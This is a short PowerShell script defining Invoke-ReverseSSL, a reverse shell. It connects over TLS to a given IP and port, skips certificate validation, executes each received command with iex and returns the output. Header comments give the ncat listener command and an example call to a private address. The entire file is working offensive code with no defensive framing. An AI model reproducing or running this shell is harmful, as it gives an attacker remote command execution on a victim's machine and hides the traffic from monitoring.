
# Listener ncat --ssl -vv -l -p 8443
# Example Invoke-ReverseSSL -IPAddress 192.168.8.162 -Port 8443


function Invoke-ReverseSSL {

[CmdletBinding()] Param(
	[Parameter(Position = 0, Mandatory = $True)]
	[String]
	$IPAddress,

	[Parameter(Position = 1, Mandatory = $False)]
	[String]
	$Port
)


$socket = New-Object Net.Sockets.TcpClient($IPAddress,$Port)
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}

}
